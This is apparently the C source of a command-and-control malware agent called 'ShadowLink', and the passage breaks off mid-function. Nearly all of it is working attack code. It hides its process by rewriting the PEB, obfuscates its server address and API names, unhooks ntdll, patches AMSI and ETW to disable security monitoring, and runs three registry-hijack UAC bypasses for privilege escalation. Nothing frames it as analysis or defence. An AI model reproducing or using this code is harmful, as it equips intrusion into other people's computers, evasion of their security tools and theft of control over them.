/*
 * ShadowLink C2 Agent - Implementation
 * Phase 9: Credential Dumping + Process Injection
 *   - WiFi passwords extraction
 *   - Browser credentials detection
 *   - Windows Credential Manager
 *   - (Coming: Process Injection)
 */

#include "agent.h"
#include "aes.h"
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <shlobj.h>  // Pour SHGetFolderPath
#include <tlhelp32.h> // Pour les processus

#define BUFFER_SIZE 4096
#define RECON_BUFFER_SIZE 65536  // 64KB pour le rapport recon
#define FILE_CHUNK_SIZE 4096     // Taille des chunks pour le transfert de fichiers
#define RECONNECT_DELAY 5000     // 5 secondes entre chaque tentative
#define MAX_RECONNECT_DELAY 60000 // Max 60 secondes

// ============================================
// FORWARD DECLARATIONS
// ============================================
int execute_command_silent(const char *command, char *output, size_t output_size);
int execute_command(const char *command, char *output, size_t output_size);
int remove_persistence(void);

// Mode stealth global (peut être désactivé)
static int stealth_mode = 1;

// Anti-EDR status
static int anti_edr_applied = 0;

// Global syscall table
SYSCALL_TABLE g_SyscallTable = {0};


// ============================================
// PROCESS MASQUERADING - Hide in Task Manager
// ============================================

// Fake process names to blend in with legitimate Windows processes
static const char* FAKE_PROCESS_NAMES[] = {
    "RuntimeBroker.exe",
    "SearchIndexer.exe", 
    "WmiPrvSE.exe",
    "spoolsv.exe",
    "svchost.exe",
    "conhost.exe",
    "dllhost.exe"
};

// Structures for PEB manipulation
typedef struct _UNICODE_STRING_PEB {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_PEB;

typedef struct _RTL_USER_PROCESS_PARAMETERS_PARTIAL {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING_PEB ImagePathName;
    UNICODE_STRING_PEB CommandLine;
} RTL_USER_PROCESS_PARAMETERS_PARTIAL;

typedef struct _PEB_PARTIAL {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    RTL_USER_PROCESS_PARAMETERS_PARTIAL* ProcessParameters;
} PEB_PARTIAL;

// Get PEB address
#ifdef _WIN64
static PEB_PARTIAL* get_peb(void) {
    return (PEB_PARTIAL*)__readgsqword(0x60);
}
#else
static PEB_PARTIAL* get_peb(void) {
    return (PEB_PARTIAL*)__readfsdword(0x30);
}
#endif

// Masquerade process by modifying PEB
void masquerade_process(const char* fake_name) {
    PEB_PARTIAL* peb = get_peb();
    if (!peb || !peb->ProcessParameters) return;
    
    // Convert fake name to wide string path
    wchar_t fake_path[MAX_PATH];
    wchar_t fake_cmdline[MAX_PATH];
    
    // Build fake Windows path
    swprintf(fake_path, MAX_PATH, L"C:\\Windows\\System32\\%S", fake_name);
    swprintf(fake_cmdline, MAX_PATH, L"%S", fake_name);
    
    // Allocate and copy new strings
    static wchar_t static_path[MAX_PATH];
    static wchar_t static_cmdline[MAX_PATH];
    wcscpy(static_path, fake_path);
    wcscpy(static_cmdline, fake_cmdline);
    
    // Modify ImagePathName
    peb->ProcessParameters->ImagePathName.Buffer = static_path;
    peb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(static_path) * sizeof(wchar_t));
    peb->ProcessParameters->ImagePathName.MaximumLength = MAX_PATH * sizeof(wchar_t);
    
    // Modify CommandLine
    peb->ProcessParameters->CommandLine.Buffer = static_cmdline;
    peb->ProcessParameters->CommandLine.Length = (USHORT)(wcslen(static_cmdline) * sizeof(wchar_t));
    peb->ProcessParameters->CommandLine.MaximumLength = MAX_PATH * sizeof(wchar_t);
}

// Random process name selection
void apply_process_masquerade(void) {
    srand((unsigned int)GetTickCount());
    int idx = rand() % (sizeof(FAKE_PROCESS_NAMES) / sizeof(FAKE_PROCESS_NAMES[0]));
    masquerade_process(FAKE_PROCESS_NAMES[idx]);
}


// ============================================
// ADVANCED EVASION - XOR STRING ENCRYPTION
// ============================================

// IP chiffrée avec XOR 0x5A: "192.168.160.1" -> bytes chiffrés
// '1'=0x31^0x5A=0x6b, '9'=0x39^0x5A=0x63, '2'=0x32^0x5A=0x68, '.'=0x2e^0x5A=0x74
// '1'=0x6b, '6'=0x6c, '8'=0x62, '.'=0x74, '1'=0x6b, '6'=0x6c, '0'=0x6a, '.'=0x74, '1'=0x6b
static unsigned char encrypted_ip[] = {0x6b, 0x63, 0x68, 0x74, 0x6b, 0x6c, 0x62, 0x74, 0x6b, 0x6c, 0x6a, 0x74, 0x6b, 0x00};

// Déchiffre une chaîne en place avec XOR
void xor_decrypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Retourne l'IP du serveur déchiffrée (buffer statique)
char* get_decrypted_server_ip(void) {
    static char decrypted_ip[16];
    static int decrypted = 0;
    
    if (!decrypted) {
        memcpy(decrypted_ip, encrypted_ip, sizeof(encrypted_ip));
        xor_decrypt(decrypted_ip, strlen(decrypted_ip), XOR_KEY);
        decrypted = 1;
    }
    return decrypted_ip;
}


// ============================================
// ADVANCED EVASION - API HASHING (djb2)
// ============================================

// Hash djb2 - rapide et efficace
unsigned long djb2_hash(const char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}

// Hashes précalculés pour les API critiques
#define HASH_ISDEBUGGERPRESENT       0x7efe2b11  // "IsDebuggerPresent"
#define HASH_CHECKREMOTEDEBUGGER     0x90b8a875  // "CheckRemoteDebuggerPresent"
#define HASH_VIRTUALALLOC            0x97bc257b  // "VirtualAlloc"
#define HASH_VIRTUALFREE             0x54a3db12  // "VirtualFree"
#define HASH_CREATEFILEA             0x7c8b8f66  // "CreateFileA"
#define HASH_DELETEFILEA             0x9e7f8e12  // "DeleteFileA"
#define HASH_SLEEP                   0x0b884101  // "Sleep"

// Résout une API par son hash dans un module
FARPROC resolve_api_by_hash(HMODULE module, unsigned long target_hash) {
    // Obtenir le DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    // Obtenir le NT header
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)module + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    // Obtenir l'export directory
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + exportDirRVA);
    
    DWORD *nameRVAs = (DWORD*)((BYTE*)module + exportDir->AddressOfNames);
    WORD *ordinals = (WORD*)((BYTE*)module + exportDir->AddressOfNameOrdinals);
    DWORD *funcRVAs = (DWORD*)((BYTE*)module + exportDir->AddressOfFunctions);
    
    // Parcourir les exports
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *funcName = (char*)((BYTE*)module + nameRVAs[i]);
        unsigned long hash = djb2_hash(funcName);
        
        if (hash == target_hash) {
            WORD ordinal = ordinals[i];
            DWORD funcRVA = funcRVAs[ordinal];
            return (FARPROC)((BYTE*)module + funcRVA);
        }
    }
    
    return NULL;
}


// ============================================
// PHASE 8: ANTI-EDR - DIRECT SYSCALLS
// ============================================

/*
 * Direct Syscalls bypass EDR hooks by calling the kernel directly
 * instead of going through the hooked ntdll.dll functions.
 * 
 * EDR hooks work by patching the first bytes of ntdll functions
 * to jump to their monitoring code. Direct syscalls skip this entirely.
 */

// Get syscall number from a function in ntdll
// Reads the "mov eax, XX" instruction that contains the syscall number
DWORD get_syscall_number(void *ntdll_base, const char *func_name) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)ntdll_base + dosHeader->e_lfanew);
    
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll_base + exportDirRVA);
    
    DWORD *nameRVAs = (DWORD*)((BYTE*)ntdll_base + exportDir->AddressOfNames);
    WORD *ordinals = (WORD*)((BYTE*)ntdll_base + exportDir->AddressOfNameOrdinals);
    DWORD *funcRVAs = (DWORD*)((BYTE*)ntdll_base + exportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)ntdll_base + nameRVAs[i]);
        if (strcmp(name, func_name) == 0) {
            void *funcAddr = (BYTE*)ntdll_base + funcRVAs[ordinals[i]];
            
            // Pattern: mov r10, rcx; mov eax, <syscall_num>
            // On x64: 4C 8B D1 B8 XX XX XX XX
            BYTE *bytes = (BYTE*)funcAddr;
            
            // Check for mov r10, rcx (4C 8B D1)
            if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
                // Check for mov eax, imm32 (B8)
                if (bytes[3] == 0xB8) {
                    // Syscall number is in the next 4 bytes (little endian)
                    return *(DWORD*)(bytes + 4);
                }
            }
            
            // If hooked, the pattern will be different (jmp to hook)
            // In that case, we return 0 to indicate failure
            return 0;
        }
    }
    return 0;
}

// Read syscall numbers from a clean ntdll on disk
int init_syscall_table_from_disk(void) {
    // Map ntdll.dll from disk (clean, unhooked copy)
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }
    
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap == NULL) {
        CloseHandle(hFile);
        return -1;
    }
    
    void *pCleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (pCleanNtdll == NULL) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return -1;
    }
    
    // Get syscall numbers from clean ntdll
    g_SyscallTable.NtAllocateVirtualMemory = get_syscall_number(pCleanNtdll, "NtAllocateVirtualMemory");
    g_SyscallTable.NtProtectVirtualMemory = get_syscall_number(pCleanNtdll, "NtProtectVirtualMemory");
    g_SyscallTable.NtWriteVirtualMemory = get_syscall_number(pCleanNtdll, "NtWriteVirtualMemory");
    g_SyscallTable.NtCreateThreadEx = get_syscall_number(pCleanNtdll, "NtCreateThreadEx");
    g_SyscallTable.NtOpenProcess = get_syscall_number(pCleanNtdll, "NtOpenProcess");
    g_SyscallTable.NtClose = get_syscall_number(pCleanNtdll, "NtClose");
    
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    
    return 0;
}

// Initialize syscall table
int init_syscall_table(void) {
    // Try to get from disk first (cleanest method)
    if (init_syscall_table_from_disk() == 0) {
        // Verify we got valid syscall numbers
        if (g_SyscallTable.NtAllocateVirtualMemory > 0 && 
            g_SyscallTable.NtProtectVirtualMemory > 0) {
            return 0;
        }
    }
    
    // Fallback: get from memory (may be hooked but worth trying)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return -1;
    
    g_SyscallTable.NtAllocateVirtualMemory = get_syscall_number(hNtdll, "NtAllocateVirtualMemory");
    g_SyscallTable.NtProtectVirtualMemory = get_syscall_number(hNtdll, "NtProtectVirtualMemory");
    g_SyscallTable.NtWriteVirtualMemory = get_syscall_number(hNtdll, "NtWriteVirtualMemory");
    g_SyscallTable.NtCreateThreadEx = get_syscall_number(hNtdll, "NtCreateThreadEx");
    g_SyscallTable.NtOpenProcess = get_syscall_number(hNtdll, "NtOpenProcess");
    g_SyscallTable.NtClose = get_syscall_number(hNtdll, "NtClose");
    
    return (g_SyscallTable.NtAllocateVirtualMemory > 0) ? 0 : -1;
}


// ============================================
// PHASE 8: ANTI-EDR - UNHOOKING NTDLL.DLL
// ============================================

/*
 * EDRs hook ntdll.dll by patching the first bytes of functions
 * with a JMP instruction to their monitoring code.
 * 
 * This technique restores the original bytes by mapping a clean
 * copy of ntdll.dll from disk and copying the .text section.
 */

// Check if a function is hooked (starts with JMP or other hook patterns)
int is_function_hooked(void *func_addr) {
    BYTE *bytes = (BYTE*)func_addr;
    
    // Common hook patterns:
    // E9 XX XX XX XX = JMP rel32 (5-byte relative jump)
    // 68 XX XX XX XX C3 = PUSH addr; RET (6-byte push-ret)
    // FF 25 XX XX XX XX = JMP [rip+XX] (6-byte indirect jump)
    // 48 B8 XX... FF E0 = MOV RAX, addr; JMP RAX (12-byte)
    
    // Check for JMP rel32
    if (bytes[0] == 0xE9) {
        return 1;
    }
    
    // Check for JMP [rip+XX]
    if (bytes[0] == 0xFF && bytes[1] == 0x25) {
        return 1;
    }
    
    // Check for MOV RAX, XX; JMP RAX
    if (bytes[0] == 0x48 && bytes[1] == 0xB8) {
        return 1;
    }
    
    // Normal syscall stub should start with:
    // 4C 8B D1 = mov r10, rcx
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1) {
        return 0;  // Not hooked
    }
    
    // Anything else is suspicious
    return 1;
}

// Unhook ntdll.dll by restoring the .text section from disk
int unhook_ntdll(void) {
    // 1. Get the base address of ntdll in memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        return -1;
    }
    
    // 2. Map a fresh copy of ntdll from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return -2;
    }
    
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap == NULL) {
        CloseHandle(hFile);
        return -3;
    }
    
    void *pCleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (pCleanNtdll == NULL) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return -4;
    }
    
    // 3. Find the .text section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        // Look for .text section
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            // 4. Calculate addresses
            void *pHookedText = (BYTE*)hNtdll + pSection[i].VirtualAddress;
            void *pCleanText = (BYTE*)pCleanNtdll + pSection[i].PointerToRawData;
            DWORD textSize = pSection[i].SizeOfRawData;
            
            // 5. Change memory protection to RWX
            DWORD oldProtect;
            if (!VirtualProtect(pHookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                UnmapViewOfFile(pCleanNtdll);
                CloseHandle(hMap);
                CloseHandle(hFile);
                return -5;
            }
            
            // 6. Copy the clean .text section over the hooked one
            memcpy(pHookedText, pCleanText, textSize);
            
            // 7. Restore original memory protection
            VirtualProtect(pHookedText, textSize, oldProtect, &oldProtect);
            
            break;
        }
    }
    
    // 8. Cleanup
    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    
    return 0;
}


// ============================================
// PHASE 8: ANTI-EDR - AMSI BYPASS
// ============================================

/*
 * AMSI (Antimalware Scan Interface) is used by Windows to scan
 * scripts and commands before execution (PowerShell, VBScript, etc.)
 * 
 * This technique patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
 */

int bypass_amsi(void) {
    // 1. Load amsi.dll (if not already loaded)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        // AMSI not loaded, nothing to bypass
        return 0;
    }
    
    // 2. Get address of AmsiScanBuffer
    void *pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL) {
        return -1;
    }
    
    // 3. Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return -2;
    }
    
    // 4. Patch the function
    // Original: mov r10, rcx; mov eax, syscall; ...
    // Patched:  xor eax, eax; ret
    // This makes it return 0 (AMSI_RESULT_CLEAN) immediately
    
#ifdef _WIN64
    // x64 patch: xor eax, eax (0x31 0xC0); ret (0xC3)
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
#else
    // x86 patch: mov eax, 0x80070057 (E_INVALIDARG); ret 0x18
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // 5. Restore memory protection
    VirtualProtect(pAmsiScanBuffer, 16, oldProtect, &oldProtect);
    
    return 0;
}


// ============================================
// PHASE 8: ANTI-EDR - ETW PATCHING
// ============================================

/*
 * ETW (Event Tracing for Windows) is used for system telemetry.
 * EDRs and Defender use ETW to monitor process behavior.
 * 
 * This technique patches EtwEventWrite to prevent logging.
 */

int patch_etw(void) {
    // 1. Get ntdll handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        return -1;
    }
    
    // 2. Get address of EtwEventWrite
    void *pEtwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite == NULL) {
        return -2;
    }
    
    // 3. Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return -3;
    }
    
    // 4. Patch: just return immediately
    // ret = 0xC3
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    // 5. Restore protection
    VirtualProtect(pEtwEventWrite, 4, oldProtect, &oldProtect);
    
    // Also try to patch NtTraceEvent
    void *pNtTraceEvent = (void*)GetProcAddress(hNtdll, "NtTraceEvent");
    if (pNtTraceEvent != NULL) {
        if (VirtualProtect(pNtTraceEvent, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            *(BYTE*)pNtTraceEvent = 0xC3;
            VirtualProtect(pNtTraceEvent, 4, oldProtect, &oldProtect);
        }
    }
    
    return 0;
}


// ============================================
// PHASE 8: MASTER ANTI-EDR FUNCTION
// ============================================

/*
 * Applies all anti-EDR techniques in the optimal order:
 * 1. Unhook ntdll first (removes existing hooks)
 * 2. Initialize syscall table (for future direct calls)
 * 3. Patch AMSI (for script execution)
 * 4. Patch ETW (disable telemetry)
 */

int apply_anti_edr(void) {
    int result = 0;
    int success_count = 0;
    
    // 1. Unhook ntdll.dll - Most important!
    if (unhook_ntdll() == 0) {
        success_count++;
    } else {
        result |= 0x01;  // Flag: unhook failed
    }
    
    // 2. Initialize syscall table
    if (init_syscall_table() == 0) {
        success_count++;
    } else {
        result |= 0x02;  // Flag: syscall init failed
    }
    
    // 3. Bypass AMSI
    if (bypass_amsi() == 0) {
        success_count++;
    } else {
        result |= 0x04;  // Flag: AMSI bypass failed
    }
    
    // 4. Patch ETW
    if (patch_etw() == 0) {
        success_count++;
    } else {
        result |= 0x08;  // Flag: ETW patch failed
    }
    
    anti_edr_applied = 1;
    
    // Return 0 if all succeeded, otherwise return error flags
    return (success_count == 4) ? 0 : result;
}


// ============================================
// PRIVILEGE ESCALATION TECHNIQUES
// ============================================
/*
 * Multiple privilege escalation techniques:
 * 1. UAC Bypass (fodhelper, eventvwr, computerdefaults)
 * 2. Token Manipulation (if SeDebugPrivilege available)
 * 3. Service exploitation
 * 4. Scheduled Task abuse
 * 5. DLL Hijacking detection
 * 6. Unquoted Service Path exploitation
 */

// Check if running as administrator
int is_admin(void) {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    return isAdmin;
}

// Check current integrity level
int get_integrity_level(char *level, size_t size) {
    HANDLE hToken;
    DWORD dwSize = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    DWORD dwIntegrityLevel;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        strcpy(level, "Unknown");
        return -1;
    }
    
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwSize);
    
    if (pTIL && GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwSize, &dwSize)) {
        dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
        
        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
            strcpy(level, "Low");
        } else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                   dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            strcpy(level, "Medium");
        } else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
                   dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID) {
            strcpy(level, "High");
        } else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
            strcpy(level, "System");
        } else {
            strcpy(level, "Unknown");
        }
        LocalFree(pTIL);
        CloseHandle(hToken);
        return dwIntegrityLevel;
    }
    
    if (pTIL) LocalFree(pTIL);
    CloseHandle(hToken);
    strcpy(level, "Unknown");
    return -1;
}

// ============================================
// UAC BYPASS - FODHELPER METHOD
// ============================================
// Works on Windows 10/11 - Auto-elevates without prompt
// Uses ms-settings protocol handler registry hijack

int uac_bypass_fodhelper(const char *command, char *result, size_t result_size) {
    HKEY hKey;
    char exePath[MAX_PATH];
    char cmdLine[MAX_PATH + 50];
    DWORD disposition;
    
    // If no command specified, re-run ourselves elevated
    if (command == NULL || strlen(command) == 0) {
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", exePath);
    } else {
        strncpy(cmdLine, command, sizeof(cmdLine) - 1);
    }
    
    // Create registry key for ms-settings\shell\open\command
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
        &hKey, &disposition) != ERROR_SUCCESS) {
        snprintf(result, result_size, "[!] Failed to create registry key\n");
        return -1;
    }
    
    // Set the default value to our command
    if (RegSetValueExA(hKey, NULL, 0, REG_SZ, 
        (BYTE*)cmdLine, (DWORD)strlen(cmdLine) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        snprintf(result, result_size, "[!] Failed to set command value\n");
        return -2;
    }
    
    // Set DelegateExecute to empty string (required for bypass)
    if (RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, 
        (BYTE*)"", 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        snprintf(result, result_size, "[!] Failed to set DelegateExecute\n");
        return -3;
    }
    
    RegCloseKey(hKey);
    
    // Launch fodhelper.exe - it will execute our command with high integrity
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, "C:\\Windows\\System32\\fodhelper.exe",
        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        snprintf(result, result_size, "[!] Failed to launch fodhelper.exe\n");
        return -4;
    }
    
    // Wait a bit for execution
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Clean up registry
    Sleep(500);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    
    snprintf(result, result_size,
        "[+] UAC Bypass (fodhelper) executed!\n"
        "    Command: %s\n"
        "    Status: Elevated process should be running\n"
        "    [*] New agent will connect with HIGH integrity\n",
        cmdLine);
    
    return 0;
}

// ============================================
// UAC BYPASS - EVENTVWR METHOD
// ============================================
// Uses mscfile handler hijack via eventvwr.exe

int uac_bypass_eventvwr(const char *command, char *result, size_t result_size) {
    HKEY hKey;
    char exePath[MAX_PATH];
    char cmdLine[MAX_PATH + 50];
    
    if (command == NULL || strlen(command) == 0) {
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", exePath);
    } else {
        strncpy(cmdLine, command, sizeof(cmdLine) - 1);
    }
    
    // Create registry key for mscfile\shell\open\command
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\mscfile\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
        &hKey, NULL) != ERROR_SUCCESS) {
        snprintf(result, result_size, "[!] Failed to create registry key\n");
        return -1;
    }
    
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmdLine, (DWORD)strlen(cmdLine) + 1);
    RegCloseKey(hKey);
    
    // Launch eventvwr.exe
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, "C:\\Windows\\System32\\eventvwr.exe",
        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Cleanup
    Sleep(500);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");
    
    snprintf(result, result_size,
        "[+] UAC Bypass (eventvwr) executed!\n"
        "    Command: %s\n",
        cmdLine);
    
    return 0;
}

// ============================================
// UAC BYPASS - COMPUTERDEFAULTS METHOD
// ============================================

int uac_bypass_computerdefaults(const char *command, char *result, size_t result_size) {
    HKEY hKey;
    char exePath[MAX_PATH];
    char cmdLine[MAX_PATH + 50];
    
    if (command == NULL || strlen(command) == 0) {
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", exePath);
    } else {
        strncpy(cmdLine, command, sizeof(cmdLine) - 1);
    }
    
    // Create registry key
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
        &hKey, NULL) != ERROR_SUCCESS) {
        snprintf(result, result_size, "[!] Failed to create registry key\n");
        return -1;
    }
    
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmdLine, (DWORD)strlen(cmdLine) + 1);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);
    
    // Launch computerdefaults.exe
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, "C:\\Windows\\System32\\computerdefaults.exe",
        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 2000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Cleanup
    Sleep(500);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    
    snprintf(result, result_size,
        "[+] UAC Bypass (computerdefaults) executed!\n"
        "    Command: %s\n",
        cmdLine);
    
    return 0;
}

// ============================================
// FIND PRIVILEGE ESCALATION VECTORS
// ============================================

// Check for unquoted service paths
int find_unquoted_service_paths(char *result, size_t result_size) {
    size_t offset = 0;
    SC_HANDLE hSCManager, hService;
    ENUM_SERVICE_STATUS_PROCESSA *services = NULL;
    DWORD bytesNeeded, servicesReturned, resumeHandle = 0;
    int found = 0;
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║     UNQUOTED SERVICE PATH VULNERABILITIES                ║\n"
        "╠══════════════════════════════════════════════════════════╣\n");
    
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCManager) {
        offset += snprintf(result + offset, result_size - offset,
            "║ [!] Cannot open Service Manager                         ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        return -1;
    }
    
    // Get required buffer size
    EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);
    
    services = (ENUM_SERVICE_STATUS_PROCESSA*)malloc(bytesNeeded);
    if (!services) {
        CloseServiceHandle(hSCManager);
        return -2;
    }
    
    if (EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, (LPBYTE)services, bytesNeeded, &bytesNeeded,
